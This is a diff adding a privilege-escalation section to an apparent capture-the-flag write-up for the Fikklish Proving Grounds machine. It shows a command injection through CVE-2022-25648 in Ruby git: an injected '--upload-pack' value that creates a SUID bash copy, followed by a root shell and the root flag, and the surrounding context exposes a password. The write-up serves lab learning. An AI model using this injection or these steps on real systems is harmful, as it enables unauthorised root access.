@@ -187,6 +187,49 @@ RapidlyLockstepDrenched103
 The other readily available password could still be useful in the future -> ollingShockingLifter231
 # Privilege Escalation
 
+Now that we have a strong foothold on the fikklish machine as the user, "Tom", we can begin to elevate our privilege for the final flag. 
+
+Based on the Ruby git files, we can use a command injection escalation technique outline in 
+CVE-2022-25648 -> https://security.snyk.io/vuln/SNYK-RUBY-GIT-2421270
+
+The CVE makes use of  the inherent "fetch" subcommands so that additional flags can be set up
+
+For example, we can inject a root shell attempt while running the fetch.rb file (Output below):
+
+
+		tom@fikklish:~$ ls -la /tmp/escalate
+		ls: cannot access '/tmp/escalate': No such file or directory
+		tom@fikklish:~$ sudo ./fetch.rb
+		Name of the project: 
+		poc
+		Custom origin name, if applicable: 
+		--upload-pack=/bin/sh -c 'cp /bin/bash /tmp/escalate; chmod +s /tmp/escalate'    
+		Location of branch: 
+		main
+
+As a result we have a newly created file in our /tmp folder named, "escalate" that has the SUID bit set, executing it runs the program with the privileges of the file's owner, not the privileges of the user running it.
+
+When running the "escalate" file, we get: a root shell
+
+		/tmp/escalate -p 
+
+tom@fikklish:~$ /tmp/escalate -p
+escalate-5.1# pwd
+/home/tom
+escalate-5.1# whoami
+root
+
+
+After some short digging through the home file directory we can find the root flag in a file, "proof.txt" :
+
+escalate-5.1# cd /root
+escalate-5.1# ls
+projects  proof.txt  rchardet-1.8.0  ruby-git-1.10.2  snap
+escalate-5.1# cat proof.txt
+==dbe56d51b09c54ba5e27d6f0d3e067c2==
+
+With this we have solved the Fikklish Proving Grounds box!
+
 
 
 
